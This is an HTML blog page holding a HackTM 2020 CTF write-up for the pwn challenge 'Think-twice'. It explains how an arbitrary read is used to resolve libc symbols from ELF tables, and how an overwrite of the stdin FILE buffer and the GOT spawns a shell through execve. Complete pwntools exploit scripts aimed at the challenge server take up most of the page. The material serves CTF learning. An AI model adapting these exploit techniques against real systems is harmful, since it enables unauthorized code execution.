@@ -1,0 +1,566 @@
+<!doctype html>
+<html lang="">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Think-twice - HackTM 2020 - slashb4sh</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="">
+    <meta property="og:site_name" content="slashb4sh" />
+    <meta property="og:locale" content="nn_NO" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="/blog/thinktwice/" />
+    <meta property="og:title" content="Think-twice - HackTM 2020" />
+    <meta property="og:image" content="/" />
+    <meta property="og:description" content="" />
+
+    
+        <meta property="twitter:site" content="@twitter.com/slashb4sh">
+    
+
+    <meta property="twitter:title" content="Think-twice - HackTM 2020" />
+    <meta property="twitter:image" content="/" />
+    <meta property="twitter:card" content="summary" />
+    <meta property="twitter:description" content="" />
+
+    
+
+    <link rel="canonical" href="/blog/thinktwice/">
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="/css/main.css" />
+
+    
+        <link rel="stylesheet" href="/css/highlight.css" />
+    
+
+    
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.css" integrity="sha256-xbqLYBMsjpuCihs+3Fgp/MFMtPdo2SWKoOjEWOqR4X0=" crossorigin="anonymous" />
+    
+
+    <link rel="shortcut icon"
+          href="/img/favicon.ico">
+
+    <link href='' rel="alternate" type="application/rss+xml" title="slashb4sh" />
+    <link href="https://fonts.googleapis.com/css?family=Fira+Code|Merriweather+Sans:400,700|Merriweather:400,700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    
+    
+
+    
+
+    
+
+<div class="my-4 my-md-5 header">
+    <div class="container">
+        <div class="row">
+            <div class="col-auto d-none d-md-block">
+                
+            </div>
+            <div class="col-auto align-self-center mr-auto">
+                <a href="/">
+                    <h1 class="font-weight-bold name">
+                        slashb4sh
+                    </h1>
+                </a>
+
+                <ul class="nav nav-primary">
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-blog" href="/blog/">
+                                
+                                Blog
+                            </a>
+                        </li>
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-about" href="/about/">
+                                
+                                About
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+
+                <ul class="nav nav-secondary">
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div class="content">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    <h1 class="mx-0 mx-md-4">
+                        Think-twice - HackTM 2020
+                    </h1>
+
+                    <div class="mb-4 mb-md-5 meta">
+                        <span class="date" title='Tue Feb 4 2020 13:00:00 UTC'>
+                            February 04, 2020
+                        </span>
+
+                        
+                            
+                        
+
+                        <span class="reading-time middot">
+                            6 minutes
+                        </span>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/ctf">CTF</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/writeup">writeup</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/pwn">Pwn</a>
+                                    </li>
+                                
+                            </ul>
+                        </div>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="markdown">
+                        
+    
+    <p>Linux userpace exploitation by parsing ELF for symbol addresses with arbitary read</p>
+<!-- raw HTML omitted -->
+<p><strong>Challenge points</strong>: 491
+<strong>No. of solves</strong>: 14
+<strong>Solved by</strong> : @sherl0ck, @slashb4sh</p>
+<p>The challenge program is rather simple. You get infinite number of arbitary reads, and one arbitary write. The libc is not given and the path of the loader is specified as <code>./loader.so</code>, hinting that a custom libc and loader is used. This is confirmed as no libc version matches are found on <a href="https://libc.blukat.me/">libc database search</a> with the leaks obtained from the server.
+A custom libc and loader means that we <strong>cannot</strong> get a shell by calling <code>system</code>. This is because the custom loader crashes when trying to load the libc of sh binary as the path to libc is specified as <code>/lib/x86_64-linux-gnu/libc.so.6</code> in the environmental variables. We have to call <code>execve</code> with 2nd and 3rd argument as <code>execve</code>.
+With n number of arbitary reads we can actually parse symbol tables in the ELF structure of the libc to obtain the address of any function we want. This technique is explained with sample code in this <a href="https://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html">blogpost</a>. Using the sample code with some modifications we can obtain the address of any symbol like <code>system</code> or <code>execve</code>. Note that this step has to be done only once, we obtain the offset from the base then hardcode it in the final exploit.</p>
+<p>Code for finding symbol address :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+s<span style="color:#f92672">=</span>remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">138.68.67.161</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">20004</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">findLibcBase</span>(ptr):
+   ptr <span style="color:#f92672">&amp;</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffffffff000</span>
+   ptr <span style="color:#f92672">=</span> ptr<span style="color:#f92672">-</span>(<span style="color:#ae81ff">0x69000</span>) <span style="color:#75715e"># offset found after running from 0</span>
+   <span style="color:#66d9ef">while</span> (leak(ptr, <span style="color:#ae81ff">4</span>)) <span style="color:#f92672">!=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">ELF</span><span style="color:#e6db74">&#34;</span>:
+	ptr <span style="color:#f92672">=</span> ptr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>
+   <span style="color:#66d9ef">return</span> ptr
+
+
+wordSz <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+hwordSz <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+bits <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+PIE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(addr,size<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>):
+	s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> &gt;</span><span style="color:#e6db74">&#34;</span>,str(<span style="color:#ae81ff">1</span>))
+	s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> [#] Enter Where: </span><span style="color:#e6db74">&#34;</span>,str(addr))
+	s<span style="color:#f92672">.</span>recvline()
+	val <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(size)
+	<span style="color:#66d9ef">return</span> val
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">findPhdr</span>(addr):
+   <span style="color:#66d9ef">if</span> bits <span style="color:#f92672">==</span> <span style="color:#ae81ff">32</span>:
+      e_phoff <span style="color:#f92672">=</span> u32(leak(addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>, wordSz)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
+   <span style="color:#66d9ef">else</span>:
+      e_phoff <span style="color:#f92672">=</span> u64(leak(addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>, wordSz)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
+   <span style="color:#66d9ef">return</span> e_phoff <span style="color:#f92672">+</span> addr
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">findDynamic</span>(Elf32_Phdr, moduleBase, bitSz):
+   <span style="color:#66d9ef">if</span> bitSz <span style="color:#f92672">==</span> <span style="color:#ae81ff">32</span>:
+      i <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">32</span>
+      p_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+      <span style="color:#66d9ef">while</span> p_type <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+         i <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>
+         p_type <span style="color:#f92672">=</span> u32(leak(Elf32_Phdr <span style="color:#f92672">+</span> i, wordSz)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
+      <span style="color:#66d9ef">return</span> u32(leak(Elf32_Phdr <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, wordSz)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">+</span> PIE
+   <span style="color:#66d9ef">else</span>:
+      i <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">56</span>
+      p_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+      <span style="color:#66d9ef">while</span> p_type <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+         i <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">56</span>
+         p_type <span style="color:#f92672">=</span> u64(leak(Elf32_Phdr <span style="color:#f92672">+</span> i, hwordSz)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
+      <span style="color:#66d9ef">return</span> u64(leak(Elf32_Phdr <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>, wordSz)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">+</span> PIE
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">findDynTable</span>(Elf32_Dyn, table, bitSz):
+   p_val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+   <span style="color:#66d9ef">if</span> bitSz <span style="color:#f92672">==</span> <span style="color:#ae81ff">32</span>:
+      i <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>
+      <span style="color:#66d9ef">while</span> p_val <span style="color:#f92672">!=</span> table:
+         i <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+         p_val <span style="color:#f92672">=</span> u32(leak(Elf32_Dyn <span style="color:#f92672">+</span> i, wordSz)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
+      <span style="color:#66d9ef">return</span> u32(leak(Elf32_Dyn <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, wordSz)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
+   <span style="color:#66d9ef">else</span>:
+      i <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>
+      <span style="color:#66d9ef">while</span> p_val <span style="color:#f92672">!=</span> table:
+         i <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
+         p_val <span style="color:#f92672">=</span> u64(leak(Elf32_Dyn <span style="color:#f92672">+</span> i, wordSz)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
+      <span style="color:#66d9ef">return</span> u64(leak(Elf32_Dyn <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, wordSz)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">findSymbol</span>(strtab, symtab, symbol, bitSz):
+   <span style="color:#66d9ef">if</span> bitSz <span style="color:#f92672">==</span> <span style="color:#ae81ff">32</span>:
+      i <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>
+      <span style="color:#66d9ef">while</span> True:
+         i <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
+         st_name <span style="color:#f92672">=</span> u32(leak(symtab <span style="color:#f92672">+</span> i, <span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
+         <span style="color:#66d9ef">if</span> leak( strtab <span style="color:#f92672">+</span> st_name, len(symbol)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> )<span style="color:#f92672">.</span>lower() <span style="color:#f92672">==</span> (symbol<span style="color:#f92672">.</span>lower() <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>):
+            <span style="color:#66d9ef">return</span> u32(leak(symtab <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">4</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
+   <span style="color:#66d9ef">else</span>:
+      <span style="color:#75715e">#i =0x17b8</span>
+      <span style="color:#75715e">#i = 0x7f50 # system</span>
+      i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8730</span> <span style="color:#75715e"># execve</span>
+      <span style="color:#66d9ef">while</span> True:
+         i <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>
+         st_name <span style="color:#f92672">=</span> u64(leak(symtab <span style="color:#f92672">+</span> i, <span style="color:#ae81ff">4</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
+         val <span style="color:#f92672">=</span> leak( strtab <span style="color:#f92672">+</span> st_name, len(symbol))<span style="color:#f92672">.</span>lower()
+	 <span style="color:#66d9ef">print</span> val
+	 <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">i = </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(i)
+         <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> (symbol<span style="color:#f92672">.</span>lower()):
+            <span style="color:#66d9ef">return</span> u64(leak(symtab <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
+
+puts_libc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lookup</span>(symbol):
+
+	<span style="color:#66d9ef">global</span> PIE
+	PIE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+
+        libcBase <span style="color:#f92672">=</span> findLibcBase(puts_libc)
+	log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Libc</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s base address:................... </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(libcBase))
+
+	libcPhdr <span style="color:#f92672">=</span> findPhdr(libcBase)
+	log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Libc</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s Program Header:................. </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(libcPhdr))
+
+	PIE <span style="color:#f92672">=</span> libcBase
+        libcDynamic <span style="color:#f92672">=</span> findDynamic(libcPhdr, libcBase, bits)
+	log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Libc</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s _DYNAMIC Section:............... </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(libcDynamic))
+
+	libcStrtab <span style="color:#f92672">=</span> findDynTable(libcDynamic, <span style="color:#ae81ff">5</span>, bits)
+	log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Libc</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s DT_STRTAB Table:................ </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(libcStrtab))
+
+	libcSymtab <span style="color:#f92672">=</span> findDynTable(libcDynamic, <span style="color:#ae81ff">6</span>, bits)
+	log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Libc</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s DT_SYMTAB Table:................ </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(libcSymtab))
+
+	symbolAddr <span style="color:#f92672">=</span> findSymbol(libcStrtab, libcSymtab, symbol, bits)
+	log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> loaded at address:.............. </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (symbol, hex(symbolAddr <span style="color:#f92672">+</span> libcBase)))
+	log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Libc</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s base address:................... </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(libcBase))
+
+
+
+puts_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000601018</span>
+puts_libc <span style="color:#f92672">=</span> u64(leak(puts_got))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Puts @ </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex((puts_libc)))
+lookup(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">execve</span><span style="color:#e6db74">&#34;</span>)
+
+s<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>The server times out after 1 minute. Within each step; finding the libc base, scanning symbol table, etc, the function breaks before finding the desired address, so the script is run again form where it broke, and initial values of iterative variables are hardcoded after each step to speed up the process and stay within the 1 minute time frame.</p>
+<h4 id="exploitation">Exploitation</h4>
+<p>Now that we have the address of <code>system</code> and <code>execve</code> at <code>0x40010</code> and <code>0xb7e80</code> respectively, only thing left is to get a shell. No mitigations are enabled on the binary except NX.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div><p>So the GOT table is an attack vector. But which function&rsquo;s GOT entry should we overwrite with <code>system</code> ?. We don&rsquo;t control the first argument of any of the imported libc functions used in the binary and nothing much can be done with an <code>8-byte write</code>. We have to find a way to extend the write primitive. One idea was to overwrite <code>fflush</code> with the arbitary write code path <code>0x400A31</code>, so everytime <code>fflush</code> is called we get an arbitary write. This didn&rsquo;t work as expected as <code>scanf</code> and <code>printf</code> crashed due to unalligned stack.</p>
+<h5 id="exploit-technique-to-get-shell">Exploit technique to get shell</h5>
+<p>We have the addresses of the file structure&rsquo;s of <code>stdin</code>, <code>stdout</code> and <code>stderr</code> in the bss section. Leak the address of <code>stdin</code> and overwrite <code>stdin-&gt;_IO_buf_base</code> with an address above GOT table. So in the next call to <code>scanf</code> we have large write to the GOT table.
+We have to call <code>execve(&quot;/bin/sh&quot;,0,0)</code> and <strong>not</strong> system(&quot;/bin/sh&rdquo;) as system tries
+After <code>scanf</code>, <code>fflush(stdout)</code> is called so we overwrite the GOT entry of <code>fflush</code> with <code>init_proc+21</code> and also overwrite <code>stdout</code> with pointer to &ldquo;/bin/sh&rdquo; in bss.</p>
+<pre><code>gdb-peda$ pd init_proc
+Dump of assembler code for function init_proc:
+   0x000000000040089b &lt;+0&gt;:	push   rbp
+   0x000000000040089c &lt;+1&gt;:	mov    rbp,rsp
+   0x000000000040089f &lt;+4&gt;:	mov    rax,QWORD PTR [rip+0x2007ea]        # 0x601090 &lt;stdin@@GLIBC_2.2.5&gt;
+   0x00000000004008a6 &lt;+11&gt;:	mov    ecx,0x0
+   0x00000000004008ab &lt;+16&gt;:	mov    edx,0x2
+   0x00000000004008b0 &lt;+21&gt;:	mov    esi,0x0
+   0x00000000004008b5 &lt;+26&gt;:	mov    rdi,rax
+   0x00000000004008b8 &lt;+29&gt;:	call   0x400750 &lt;setvbuf@plt&gt;
+   0x00000000004008bd &lt;+34&gt;:	mov    rax,QWORD PTR [rip+0x2007bc]        # 0x601080 &lt;stdout@@GLIBC_2.2.5&gt;
+   0x00000000004008c4 &lt;+41&gt;:	mov    ecx,0x0
+</code></pre><p>Why call <code>init_proc</code>?  Within <code>init_proc</code>, <code>setvbuf</code> is called,  which we overwrite with <code>execve</code>. At <code>flush(stdout)</code> first argument is a pointer to &ldquo;/bin/sh&rdquo; and the 3rd argument is a pointer to NULL, and jumping to <code>init_proc+21</code> sets the 2nd argument as NULL.</p>
+<p><code>execve</code> is successfully called with all arguemnts set.</p>
+<p>Final exploit :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+s<span style="color:#f92672">=</span>remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">138.68.67.161</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">20004</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(addr,size<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>):
+	s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> &gt;</span><span style="color:#e6db74">&#34;</span>,str(<span style="color:#ae81ff">1</span>))
+	s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> [#] Enter Where: </span><span style="color:#e6db74">&#34;</span>,str(addr))
+	s<span style="color:#f92672">.</span>recvline()
+	val <span style="color:#f92672">=</span>  s<span style="color:#f92672">.</span>recv(size)
+	<span style="color:#66d9ef">return</span> val
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write</span>(where,what,val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>):
+	<span style="color:#66d9ef">if</span> (val <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>):
+		s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> &gt;</span><span style="color:#e6db74">&#34;</span>,str(<span style="color:#ae81ff">3</span>))
+	<span style="color:#66d9ef">else</span>:
+		s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> &gt;</span><span style="color:#e6db74">&#34;</span>,str(<span style="color:#ae81ff">2</span>))
+	s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> [#] Enter Where: </span><span style="color:#e6db74">&#34;</span>,str(where))
+	s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> [#] Enter What: </span><span style="color:#e6db74">&#34;</span>,str(what))
+
+
+ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000040092F</span>
+code_block <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000400A50</span>
+fflush_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000601050</span>
+puts_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000601018</span>
+printf_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000601030</span>
+exit_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000601068</span>
+write_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000601020</span>
+codeBlock <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000400AA9</span>
+
+got_start <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000601000</span>
+
+stdin <span style="color:#f92672">=</span> u64(leak(<span style="color:#ae81ff">0x601090</span>))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">stdin @ </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(stdin))
+buf_base <span style="color:#f92672">=</span> stdin <span style="color:#f92672">+</span><span style="color:#ae81ff">0x38</span>
+
+puts_libc <span style="color:#f92672">=</span> u64(leak(puts_got))
+libcBase <span style="color:#f92672">=</span> puts_libc<span style="color:#f92672">-</span><span style="color:#ae81ff">0x691c0</span>
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">libc base @ </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(libcBase))
+system <span style="color:#f92672">=</span> libcBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40010</span>
+execve <span style="color:#f92672">=</span> libcBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xb7e80</span>
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">execve @ </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(execve))
+
+fake_got <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(ret)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span>  p64(<span style="color:#ae81ff">0x0000000004008B0</span>) <span style="color:#f92672">+</span>p64(execve) <span style="color:#f92672">+</span>p64(ret)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x601070</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">6</span>
+
+write(buf_base , got_start)
+s<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> &gt;</span><span style="color:#e6db74">&#34;</span>,fake_got)
+
+
+s<span style="color:#f92672">.</span>interactive()
